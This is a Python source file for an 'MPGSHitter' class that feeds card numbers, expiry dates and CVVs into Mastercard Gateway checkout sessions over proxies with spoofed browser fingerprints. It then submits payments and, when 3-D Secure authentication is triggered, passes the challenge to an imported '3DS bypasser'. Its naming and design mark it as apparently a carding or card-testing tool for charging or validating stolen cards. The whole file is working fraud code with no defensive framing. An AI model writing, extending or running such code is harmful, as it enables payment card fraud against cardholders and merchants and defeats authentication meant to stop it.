import asyncio
import re
import json
from curl_compat import ChromeSession
from stripe_3ds_bypasser import Stripe3DSBypasser

class MPGSHitter:
    @staticmethod
    def extract_session_id(url: str) -> str:
        """Extract MPGS session ID from the checkout URL."""
        match = re.search(r'/(?:session|pay)/([a-zA-Z0-9]+)', url)
        if match:
            return match.group(1)
        return ""

    @classmethod
    async def process_card(cls, url: str, card_dict: dict, proxy_data: dict = None, profile: dict = None) -> dict:
        """Process a card through the MPGS gateway session."""
        session_id = cls.extract_session_id(url)
        if not session_id:
            return {"success": False, "error": "Invalid MPGS session URL"}
            
        result = {
            "success": False,
            "session_expired": False,
            "decline_code": None,
            "error": None,
            "3ds_bypassed": False,
            "raw_response": {}
        }
        
        proxies = None
        if proxy_data:
            auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
            purl = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}
            
        headers = {
            'User-Agent': (profile or {}).get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36"),
            'Accept': 'application/json, text/plain, */*',
            'Referer': url,
            'Origin': 'https://bobsal.gateway.mastercard.com'
        }
        
        try:
            impersonate = (profile or {}).get("impersonate", "chrome124")
            async with ChromeSession(impersonate=impersonate, proxies=proxies, timeout=20) as sess:
                
                # Phase 1: pageState
                page_state_url = f'https://bobsal.gateway.mastercard.com/checkout/api/pageState/{session_id}'
                async with sess.post(page_state_url, headers=headers) as r:
                    if r.status_code == 500:
                        result["session_expired"] = True
                        result["error"] = "Session Dead (500)"
                        return result
                    
                    state_text = r.text() if callable(r.text) else r.text
                    try:
                        state_json = json.loads(state_text)
                    except json.JSONDecodeError:
                        result["error"] = "Invalid pageState response"
                        return result
                        
                    if state_json.get("gatewayRecommendation") == "DO_NOT_PROCEED":
                        result["session_expired"] = True
                        result["error"] = "Session locked (DO_NOT_PROCEED)"
                        return result
                        
                # Phase 2: updateSessionUrl
                update_url = f'https://bobsal.gateway.mastercard.com/checkout/api/updateSessionUrl/{session_id}?charset=UTF-8'
                update_headers = headers.copy()
                update_headers['Content-Type'] = 'application/json;charset=UTF-8'
                
                name_on_card = f"{card_dict.get('firstName', 'Sam')} {card_dict.get('lastName', 'Shoal')}"
                payload = {
                    'sourceOfFunds': {
                        'provided': {
                            'card': {
                                'number': card_dict['card'],
                                'expiry': {
                                    'month': card_dict['month'],
                                    'year': card_dict['year'][-2:] # Ensure 2 digit year
                                },
                                'securityCode': card_dict['cvv'],
                                'nameOnCard': name_on_card
                            }
                        }
                    }
                }
                
                async with sess.post(update_url, headers=update_headers, json=payload) as r:
                    if r.status_code != 200:
                        result["error"] = f"Injection failed: {r.status_code}"
                        return result
                        
                # Phase 3: performPayment
                pay_url = f'https://bobsal.gateway.mastercard.com/checkout/api/performPayment/{session_id}?charset=UTF-8'
                async with sess.post(pay_url, headers=update_headers, json={}) as r:
                    pay_text = r.text() if callable(r.text) else r.text
                    try:
                        pay_json = json.loads(pay_text)
                    except json.JSONDecodeError:
                        result["error"] = "Invalid performPayment response"
                        return result
                        
                    result["raw_response"] = pay_json
                    
                    # Evaluate success
                    if pay_json.get("success") is True:
                        result["success"] = True
                        return result
                        
                    # Phase 4: 3DS Intercept
                    if pay_json.get("threeDsRequired") is True:
                        # Fetch pageState again to get ACS HTML/Redirect
                        async with sess.post(page_state_url, headers=headers) as r3:
                            r3_text = r3.text() if callable(r3.text) else r3.text
                            try:
                                r3_json = json.loads(r3_text)
                                acs_url = r3_json.get("acsReturnUri")
                                
                                # Format for generic bypasser
                                next_action = {
                                    "type": "redirect_to_url",
                                    "redirect_to_url": {
                                        "url": acs_url
                                    }
                                }
                                
                                # The bypasser expects a specific format, we can spoof it
                                bypass_payload = {
                                    "raw_response": {
                                        "next_action": next_action,
                                        "client_secret": session_id, # Dummy secret
                                        "pk_key": "dummy_pk"
                                    }
                                }
                                
                                # Route to bypasser
                                bypass_result = await Stripe3DSBypasser.resolve_3ds(bypass_payload, proxy_data, profile)
                                if bypass_result.get("success"):
                                    result["success"] = True
                                    result["3ds_bypassed"] = True
                                    return result
                                else:
                                    result["error"] = "3DS Bypass Failed"
                                    return result
                                    
                            except Exception as e:
                                result["error"] = f"3DS Extraction Error: {str(e)}"
                                return result
                                
                    # Phase 5: Map Decline
                    result["decline_code"] = pay_json.get("gatewayRecommendation", "DECLINED")
                    if "authentication_unsuccessful" in pay_text:
                        result["decline_code"] = "authentication_unsuccessful"
                        
                    return result

        except Exception as e:
            result["error"] = f"Engine Error: {str(e)}"
            return result
